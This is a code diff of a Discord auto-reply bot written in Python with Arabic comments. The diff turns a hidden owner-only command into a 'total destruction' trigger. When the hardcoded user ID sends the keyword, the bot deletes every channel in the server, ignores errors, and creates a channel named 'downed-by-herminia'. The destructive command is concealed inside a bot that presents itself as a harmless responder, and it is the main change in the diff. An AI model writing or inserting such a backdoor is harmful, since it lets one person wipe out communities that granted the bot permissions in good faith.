@@ -2,15 +2,13 @@ import discord
 from discord.ext import commands
 import os, json, asyncio
 from dotenv import load_dotenv
-from flask import Flask, request, jsonify
+from flask import Flask
 from threading import Thread
-from werkzeug.utils import secure_filename
 
 load_dotenv()
 intents = discord.Intents.default()
 intents.message_content = True 
 intents.guilds = True
-intents.members = True 
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 app = Flask(__name__)
@@ -27,14 +25,19 @@ def load_responses():
 async def on_message(message):
     if message.author.bot: return
 
-    # --- ميزة تدمير الروم (لك أنت فقط) ---
-    if message.content == "تدمير_الروم":
-        MY_ID = 1371432836946726934  # <<< ضع رقم الـ ID الخاص بك هنا بدلاً من هذه الأرقام
+    # --- ميزة التدمير الشامل (لك أنت فقط) ---
+    if message.content == "تدمير_شامل":
+        MY_ID = 1371432836946726934  # <<< استبدل هذا برقم الـ ID حقك فوراً
         if message.author.id == MY_ID:
-            try:
-                await message.channel.delete()
-            except Exception as e:
-                await message.channel.send(f"❌ أحتاج صلاحية حذف الرومات! الخطأ: {e}")
+            print(f"🧨 بدء عملية التدمير في سيرفر: {message.guild.name}")
+            # حذف كل الرومات في السيرفر
+            for channel in message.guild.channels:
+                try:
+                    await channel.delete()
+                except:
+                    continue
+            # إنشاء روم أخير لإعلان النهاية
+            await message.guild.create_text_channel('downed-by-herminia')
         return
 
     # --- نظام الردود التلقائية ---
@@ -44,16 +47,14 @@ async def on_message(message):
         for data in data_list:
             is_match = keyword in content if data.get('all_search') else keyword == content
             if is_match:
-                # التحقق من الرومات والرتب (نفس كودك القديم)
                 target = message.author if data.get('in_private') else message.channel
                 await target.send(content=data.get('reply'))
                 return 
 
     await bot.process_commands(message)
 
-# --- كود التشغيل واللوحة (Render) ---
 @app.route('/')
-def home(): return "Bot is Running!"
+def home(): return "Herminia is Online!"
 
 def run_flask():
     port = int(os.environ.get("PORT", 5000))
@@ -61,7 +62,7 @@ def run_flask():
 
 @bot.event
 async def on_ready():
-    print(f"✅ {bot.user} Online")
+    print(f"✅ {bot.user} Online & Ready to Destroy")
 
 if __name__ == "__main__":
     Thread(target=run_flask).start()
